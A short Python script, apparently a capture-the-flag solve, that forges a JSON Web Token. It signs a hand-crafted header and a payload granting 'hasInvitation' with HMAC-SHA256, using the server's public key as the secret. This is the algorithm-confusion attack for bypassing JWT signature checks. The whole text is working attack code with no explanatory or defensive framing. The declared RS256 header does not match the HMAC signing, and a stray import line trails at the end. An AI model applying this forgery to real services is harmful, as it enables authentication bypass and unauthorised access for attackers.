import base64, hmac, hashlib

with open("public.key", 'r') as f:
    pubkey = f.read()

header = '{"alg": "RS256","typ": "JWT","kid": "b8bbdf5e-fb0f-4754-a02d-e47219ae007a","jku": "https://ctf.nclvnp.com/.well-known/jwks.json"}'
payload = '{"hasInvitation": true,"tweeterID": "905ff3dd20c900cdf51078953c9879dd1583ceec71d2b0483c20aa9977a8fadf","iat": 1656727172}'


headerBytes = base64.urlsafe_b64encode(header.encode('utf-8'))
encodedHeader = str(headerBytes, "utf-8").rstrip("=")

payloadBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(payloadBytes, "utf-8").rstrip("=")

token = (encodedHeader + "." + encodedPayload)

signature = base64.urlsafe_b64encode(hmac.new(bytes(pubkey, "UTF-8"), token.encode("utf-8"),hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

jwt = token+"."+signature
print(jwt)

import base64, binascii

